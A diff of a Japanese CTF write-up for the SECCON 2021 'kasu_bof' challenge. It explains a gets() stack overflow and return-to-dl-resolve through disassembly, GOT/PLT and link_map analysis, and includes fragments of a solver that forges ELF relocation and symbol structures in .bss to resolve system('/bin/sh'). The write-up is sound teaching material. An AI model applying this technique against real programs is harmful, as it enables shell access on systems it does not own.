@@ -51,11 +51,11 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 - ~gets~ を使用しているため、 ~\n~ (0x0a) が入力されるまで配列 ~buf~ に任意の文字を入力可能
 
   
-このことから，配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる．
+このことから、配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる。
 
 
-また、問題文に ~return to dl resolve~ という攻撃方法を使用すれば良い旨のコメントがあるため，
-スタックバッファオーバフローを利用して， ~return to dl resolve~ を用いて ~shell~ を起動できるとよさそうである．
+また、問題文に ~return to dl resolve~ という攻撃方法を使用すれば良い旨のコメントがあるため、
+スタックバッファオーバフローを利用して、 ~return to dl resolve~ を用いて ~shell~ を起動できるとよさそうである。
 
 
 よって、この問題以下の方針で解いていく。
@@ -73,79 +73,160 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 
    そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。
 
-*** ~main~ から ~puts~ が呼び出されるまで
-    main から puts が呼びだされるまでの流れを説明
+*** ~main~ から ~gets~ が呼び出される全体の流れ
+    問題のプログラムをディスアセンブルし、どのようにして ~gets~ が呼び出されているのか確認してみる。
+    #+begin_src
+08049180 <main>:
+ 8049180:       55                      push   ebp
+ 8049181:       89 e5                   mov    ebp,esp
+ 8049183:       81 ec 98 00 00 00       sub    esp,0x98
+ 8049189:       8d 85 7c ff ff ff       lea    eax,[ebp-0x84]
+ 804918f:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
+ 8049196:       89 04 24                mov    DWORD PTR [esp],eax
+ 8049199:       e8 a2 fe ff ff          call   8049040 <gets@plt>
+ 804919e:       31 c9                   xor    ecx,ecx
+ 80491a0:       89 85 78 ff ff ff       mov    DWORD PTR [ebp-0x88],eax
+ 80491a6:       89 c8                   mov    eax,ecx
+ 80491a8:       81 c4 98 00 00 00       add    esp,0x98
+ 80491ae:       5d                      pop    ebp
+ 80491af:       c3                      ret    
+    #+end_src
+    ディスアセンブルした ~main~ を見てみると、 ~0x8049199~ のアドレスにおいて、 ~gets@plt~ である ~0x8049040~ にジャンプしている。 ~gets@plt~ は、 ~.plt~ セクションに存在するため、 ~.plt~ セクションもディスアセンブルしてみる。
+    
+    #+begin_src
+08049030 <.plt>:
+ 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
+ 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
+ 804903c:       00 00                   add    BYTE PTR [eax],al
+        ...
+
+08049040 <gets@plt>:
+ 8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
+ 8049046:       68 00 00 00 00          push   0x0
+ 804904b:       e9 e0 ff ff ff          jmp    8049030 <.plt>
+
+08049050 <__libc_start_main@plt>:
+ 8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
+ 8049056:       68 08 00 00 00          push   0x8
+ 804905b:       e9 d0 ff ff ff          jmp    8049030 <.plt>
+    #+end_src
+    先程呼ばれた ~gets@plt~ を確認してみると、 まず ~jmp    DWORD PTR ds:0x804c00c~ で ~0x804c00c~ 番地に格納されたアドレスへジャンプしている。この ~0x804c00c~ のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された ~gets~ のアドレスが格納される。
+
+    
+    ここで、checksecの結果から、配布された実行ファイルは *Partial RELRO* であることがわかっている。 *Partial RELRO* は、共有ライブラリが遅延バインドされることを表しており、1回目のライブラリ関数の呼び出しの際に、共有ライブラリのアドレスを解決し、解決したアドレスをGOTへ格納する。
+    このため、2回目以降のライブラリ関数の呼び出しは、GOTに格納された解決済のアドレスへジャンプすることで可能となる。
+
+    
+    しかし、問題を見てみると、 ~gets@plt~ は1回目の呼び出しであるため、まだGOTには解決されたアドレスは格納されていない。
+    そこで、1回目のライブラリ関数の呼び出し時に、GOTには何が格納されているのか確認してみる。
+
+    以下は、 ~gets@plt~ を呼び出す前のGOTの状態。
+    #+begin_src
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 2
+ 
+[0x804c00c] gets@GLIBC_2.0  →  0x8049046
+[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7de1de0
+    #+end_src
+    GOTを確認すると、次の命令のアドレス ( ~0x8049046~ )がGOTに格納されていることがわかる。
+    このため、引き続き ~0x8049046~ からの命令読んでいく。
+
+    
+    次の命令 ~push   0x0~ では、スタックに ~0x0~ を積み、その後 ~jmp    8049030 <.plt>~ で ~.plt~ セクションの先頭にジャンプしている。
+
+    ~.plt~ の先頭の命令は、 ~push   DWORD PTR ds:0x804c004~ となっており、 ~0x804c004~ に格納されている値をスタックに積む。
+    そして、次の命令 ~jmp    DWORD PTR ds:0x804c008~ で ~0x804c008~ に格納されているアドレスへジャンプする。
+
+    ここで、 ~0x804c004~ および ~0x804c008~ 番地には何が格納されているのか調べてみる。    
+    #+begin_src
+gef➤  hexdump dword 0x804c004
+0x0804c004│+0x0000   <_GLOBAL_OFFSET_TABLE_+0004> 0xf7ffd990   
+0x0804c008│+0x0004   <_GLOBAL_OFFSET_TABLE_+0008> 0xf7fe7ac0   
+    #+end_src
+    すると、 スタックには ~0xf7ffd990~ が積まれ、最終的に ~0xf7fe7ac0~ 番地へジャンプしていることがわかる。    
+    そして、 ~0xf7fe7ac0~ へジャンプ後、 ~gets~ のアドレスがGOTへ格納され、 ~gets~ が実行される。
+
+
+    以上が ~main~ から ~gets~ が実行されるまでの流れであり、 ~return to dl resolve~ をするために必要となる ~.plt~ セクション以降の流れについて以降では詳しく見ていく。
     
 *** ~.plt~ セクションからアドレス解決の流れ
-    ~.plt~ セクションから、 ~link_map~ 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。
+    さて、 ~main~ から ~gets~ が呼び出される全体像が掴めたところで、最後にジャンプしたアドレス ~0xf7fe7ac0~ から先を追ってみる。
+    ジャンプ先の  ~0xf7fe7ac0~ が ~_dl_runtime_resolve~ となっており、この関数により ~gets~ のアドレスが解決される。
+     ~_dl_runtime_resolve~ は引数として ~link_map~ 構造体と、 後述する ~Elf32_Rel~ 構造体へのオフセットを示す ~reloc_arg~ という2つの値を取る。
 
+    そこで、ここから先では、 ~_dl_runtime_resolve~ を呼び出す際に スタックに積まれた ~0xf7ffd990~ を ~_dl_runtime_resolve~ の第一引数である ~link_map~ 構造体のアドレス、 ~0x0~ を第二引数である ~reloc_arg~ として扱う。
+
+   それでは、次に引数として渡された ~link_map~ 構造体がどのような役割を担っているのかを調査する。
     
-    そこで、以下では、 ~gets@plt~ が呼び出されてから ~gets~ のシンボルが解決されるまでの流れを示す。
+    # ~.plt~ セクションから、 ~link_map~ 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。
+    
+    # そこで、以下では、 ~gets@plt~ が呼び出されてから ~gets~ のシンボルが解決されるまでの流れを示す。
 
 
-    参考
-    #+begin_example    
-        .rel.plt                         .dynsym                                           .dynstr                                    
-            |                                |                                                 |
-            |                                |                                                 |
-reloc_arg---+   reloc_arg + .rel.plt         |                                                 |
-            |                                |                                                 |
-            +-->|-----------+----------|     |                                                 |
-                | Elf32_Rel | r_offset |     |                                                 |
-                |           | r_info   |-----+  (r_info>>8 + .dynsym)*sizeof(Elf32_Sym)        |
-                |-----------+----------|     |                                                 |
-                                             |                                                 |
-                                             +->|-----------+---------------------------|      |
-                                                | Elf32_Sym | st_name                   |------+   st_name + .dynstr
-                                                |           | st_value                  |      |
-                                                |           | st_size                   |      |
-                                                |           | st_info st_other st_shndx |      |
-                                                |-----------+---------------------------|      |
-                                                                                               |
-                                                                                               +-->|-----------+----------|
-                                                                                                   | symbol    |  'gets'  |
-                                                                                                   |-----------+----------|
-    #+end_example
+#     参考
+#     #+begin_example    
+#         .rel.plt                         .dynsym                                           .dynstr                                    
+#             |                                |                                                 |
+#             |                                |                                                 |
+# reloc_arg---+   reloc_arg + .rel.plt         |                                                 |
+#             |                                |                                                 |
+#             +-->|-----------+----------|     |                                                 |
+#                 | Elf32_Rel | r_offset |     |                                                 |
+#                 |           | r_info   |-----+  (r_info>>8 + .dynsym)*sizeof(Elf32_Sym)        |
+#                 |-----------+----------|     |                                                 |
+#                                              |                                                 |
+#                                              +->|-----------+---------------------------|      |
+#                                                 | Elf32_Sym | st_name                   |------+   st_name + .dynstr
+#                                                 |           | st_value                  |      |
+#                                                 |           | st_size                   |      |
+#                                                 |           | st_info st_other st_shndx |      |
+#                                                 |-----------+---------------------------|      |
+#                                                                                                |
+#                                                                                                +-->|-----------+----------|
+#                                                                                                    | symbol    |  'gets'  |
+#                                                                                                    |-----------+----------|
+#     #+end_example
     
 **** ~link_map~ 構造体
-   ~link_map~ はELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス，再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。   
+   ~link_map~ 構造体は、ELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス、再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。
+   実際の構造を知るために、定義を参照してみる。
+   - https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95
+     #+begin_src c
+       struct link_map
+       {
+	 /* These first few members are part of the protocol with the debugger.
+	    This is the same format used in SVR4.  */
 
-   ~plt~ にジャンプする前に、 ~link_map~ 構造体のアドレス（GOTの2番目のエントリ）とGOTのオフセット ( ~reloc_arg~ )がスタックに格納される。
-     - https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95
-	 #+begin_src c
-	   struct link_map
-	   {
-	     /* These first few members are part of the protocol with the debugger.
-		This is the same format used in SVR4.  */
+	 ElfW(Addr) l_addr;		/* Difference between the address in the ELF
+					  file and the addresses in memory.  */
+	 char *l_name;		/* Absolute file name object was found in.  */
+	 ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
+	 struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+	 ...
 
-	     ElfW(Addr) l_addr;		/* Difference between the address in the ELF
-					      file and the addresses in memory.  */
-	     char *l_name;		/* Absolute file name object was found in.  */
-	     ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
-	     struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
-	     ...
+	 ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
+		  + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
+	 ...
+       }
+     #+end_src
+     - ソースコード中の ~ElfW(hoge)~ のマクロは、 ~Elf32_hoge~ と展開される。
+       - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/link.h#L28
 
-	     ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
-		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
-	     ...
-	   }
-
-	 #+end_src
-	 
-     以下の例の場合， ~link_map~ 構造体のアドレス ~0x804c004~ と ~gets~ の ~reloc_arg~ ~0x0~ をスタックにプッシュしている。
-	#+begin_src
-     gef➤  x/10i $eip
-     => 0x8049030:   push   DWORD PTR ds:0x804c004
-	0x8049036:   jmp    DWORD PTR ds:0x804c008
-	0x804903c:   add    BYTE PTR [eax],al
-	0x804903e:   add    BYTE PTR [eax],al
-	0x8049040 <gets@plt>:        jmp    DWORD PTR ds:0x804c00c
-	0x8049046 <gets@plt+6>:      push   0x0
-	0x804904b <gets@plt+11>:     jmp    0x8049030
-	0x8049050 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x804c010
-	0x8049056 <__libc_start_main@plt+6>: push   0x8
-	0x804905b <__libc_start_main@plt+11>:        jmp    0x8049030
-	#+end_src
+   以下の例の場合、 ~link_map~ 構造体のアドレス ~0x804c004~ と ~gets~ の ~reloc_arg~ ~0x0~ をスタックにプッシュしている。
+      #+begin_src
+   gef➤  x/10i $eip
+   => 0x8049030:   push   DWORD PTR ds:0x804c004
+      0x8049036:   jmp    DWORD PTR ds:0x804c008
+      0x804903c:   add    BYTE PTR [eax],al
+      0x804903e:   add    BYTE PTR [eax],al
+      0x8049040 <gets@plt>:        jmp    DWORD PTR ds:0x804c00c
+      0x8049046 <gets@plt+6>:      push   0x0
+      0x804904b <gets@plt+11>:     jmp    0x8049030
+      0x8049050 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x804c010
+      0x8049056 <__libc_start_main@plt+6>: push   0x8
+      0x804905b <__libc_start_main@plt+11>:        jmp    0x8049030
+      #+end_src
    
 
    以下のサイトを参考に、gdbで、ELFの構造体を読み込めるようにする。
@@ -174,10 +255,10 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
    #+end_src
 
 **** ~.dynamic~ セクション
-  ~.dynamic~ セクションのアドレスは， ~link_map~ 構造体の ~l_ld~ に格納されるため、
+  ~.dynamic~ セクションのアドレスは、 ~link_map~ 構造体の ~l_ld~ に格納されるため、
   ~.dynamic~ セクションのアドレスは ~0x804bf14~ であるとわかる。
    
-  ~.dynamic~ セクションは， ~ELF_Dyn~ 構造体のエントリを ~d_tag~ の種類の数保持しており、この中に ~.rel.plt~ や ~.dynsym~ , ~.dynstr~ などのアドレスが格納されている。
+  ~.dynamic~ セクションは、 ~ELF_Dyn~ 構造体のエントリを ~d_tag~ の種類の数保持しており、この中に ~.rel.plt~ や ~.dynsym~ , ~.dynstr~ などのアドレスが格納されている。
     - ELF32_Dyn 構造体
       - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840
 	#+begin_src c
@@ -206,8 +287,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 	  ...
 	#+end_src
 	 
-    また、このとき ~.dynamic~ セクションは， ~d_tag~ の順番に並んでいる訳ではないことに注意。
-    - 以下の例では， ~DT_STRTAB, DT_SYMTAB~ は8，9番目のエントリ， ~DT_JMPREL, DT_REL~ は16，17番目のエントリに配置
+    また、このとき ~.dynamic~ セクションは、 ~d_tag~ の順番に並んでいる訳ではないことに注意。
+    - 以下の例では、 ~DT_STRTAB, DT_SYMTAB~ は8、9番目のエントリ、 ~DT_JMPREL, DT_REL~ は16、17番目のエントリに配置
       #+begin_src 
       0x0804bf14│+0x0000   <_DYNAMIC+0000> 0x00000001
       0x0804bf18│+0x0004   <_DYNAMIC+0004> 0x00000001
@@ -225,7 +306,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       #+end_src
        
 **** ~.rel.plt~ セクション
-  ~rel.plt~ セクションは， ~ELF32_Rel~ 構造体の配列となっている。
+  ~rel.plt~ セクションは、 ~ELF32_Rel~ 構造体の配列となっている。
     - ELF32_Rel 構造体
       - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634
 	#+begin_src c
@@ -256,8 +337,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 	  0x080482ec│+0x0014   0x00000000
       #+end_src
 	 
-    ~r_info~ は，シンボルを解決するために使用される。
-    ~r_info~ を 8 byte 右シフトすることにより， ~dynsym~ のインデックスを取得することができる。
+    ~r_info~ は、シンボルを解決するために使用される。
+    ~r_info~ を 8 byte 右シフトすることにより、 ~dynsym~ のインデックスを取得することができる。
     - ~r_info~ の定義
       #+begin_src c
 	/* How to extract and insert information held in the r_info field.  */
@@ -272,7 +353,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       #+end_src
        
 **** ~.dynsym~ セクション
-    ~.dynsym~ セクションは， ~Elf32_Sym~ 構造体の配列となっている。
+    ~.dynsym~ セクションは、 ~Elf32_Sym~ 構造体の配列となっている。
       - ELF32_Sym 構造体
 	- https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519
 	  #+begin_src c
@@ -286,7 +367,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 	      Elf32_Section st_shndx;		/* Section index */
 	    } Elf32_Sym;
           #+end_src
-	  - ~st_name~ は，実際にシンボルが置かれている ~.dynstr~ セクションのオフセット
+	  - ~st_name~ は、実際にシンボルが置かれている ~.dynstr~ セクションのオフセット
     ~r_info~ からインデックスを計算し、 ~Elf32_Sym~ のアドレスを特定してみる。
     #+begin_src
       gef➤  set $symtab = (Elf32_Sym *)($l.l_ld[9].d_un.d_ptr)
@@ -302,8 +383,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       }
     #+end_src
 **** ~.dynstr~ セクション
-    ~st_name~ のオフセットを ~.dynstr~ セクションのアドレスに足し合わせたアドレスが，シンボルを指すアドレスとなっている。
-    - 以下の例では， ~l_ld~ から ~.dynsym~ セクションのアドレスを取得し，その後 ~r_info~ から取得したインデックスを元に ~.dynstr~ セクションからシンボル名を解決 ( ~reloc_arg = 0~ の ~gets~ が解決)
+    ~st_name~ のオフセットを ~.dynstr~ セクションのアドレスに足し合わせたアドレスが、シンボルを指すアドレスとなっている。
+    - 以下の例では、 ~l_ld~ から ~.dynsym~ セクションのアドレスを取得し、その後 ~r_info~ から取得したインデックスを元に ~.dynstr~ セクションからシンボル名を解決 ( ~reloc_arg = 0~ の ~gets~ が解決)
     #+begin_src
       gef➤  set $strtab = (char*)($l.l_ld[8].d_un.d_ptr)
       gef➤  set $undef_name = $strtab + $sym.st_name
@@ -359,7 +440,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     ~Elf32_Sym~ 構造体の ~st_name~ は、 ~.dynstr~ の値から ~system~ のシンボルを配置したアドレスまでのオフセットを設定する。
     このため、事前にオフセットの値を計算し、 ~Elf32_Sym~ 構造体に格納しておく。
 
-    ~st_info~ は、global変数であることを指す ~0x12~ を設定しておく必要があるため、設定しておく。
+    ~st_info~ は、グローバル関数であることを指す ~0x12~ を設定しておく必要があるため、設定しておく。
     #+begin_src python
       st_name = system_symbol_addr - dynstr
       st_value = 0x0
@@ -370,7 +451,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     #+end_src
 
 **** ~.bss~ 領域への作成した構造体やシンボルの格納
-    ~.bss~ 領域には，以下のように作成した ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体， ~system~ のシンボル，および ~/bin/sh~ の文字列が格納する．    
+    ~.bss~ 領域には、以下のように作成した ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体、 ~system~ のシンボル、および ~/bin/sh~ の文字列が格納する。    
     #+begin_example
     |-----------+----------.bss-------------+---------|
     | Elf32_Rel | r_offset                  | 8 byte  |
@@ -394,10 +475,10 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     |-----------+---------------------------+---------|
     |           |                           |         |
     #+end_example
-    このとき， ~Elf32_Sym~ 構造体は， ~dynsym~ セクションのアドレスから， ~0x10~ byteの間隔で配置されなければならないため( ~Elf32_Sym~ 構造体のサイズが ~0x10~ byteのため)，
-    必要なbyte数だけalignしている．
+    このとき、 ~Elf32_Sym~ 構造体は、 ~dynsym~ セクションのアドレスから、 ~0x10~ byteの間隔で配置されなければならないため( ~Elf32_Sym~ 構造体のサイズが ~0x10~ byteのため)、
+    必要なbyte数だけalignしている。
 
-    Solverを書くときは，事前に ~.bss~ のどのアドレスがどの構造体やシンボルに対応するか計算しておき，ROPで ~gets~ の引数として指定しておき，ROPチェインが発火後に，それぞれの構造体やシンボルを書き込んでいく．
+    Solverを書くときは、事前に ~.bss~ のどのアドレスがどの構造体やシンボルに対応するか計算しておき、ROPで ~gets~ の引数として指定しておき、ROPチェインが発火後に、それぞれの構造体やシンボルを書き込んでいく。
     #+begin_src python
       Elf32_Rel_addr = bss
 
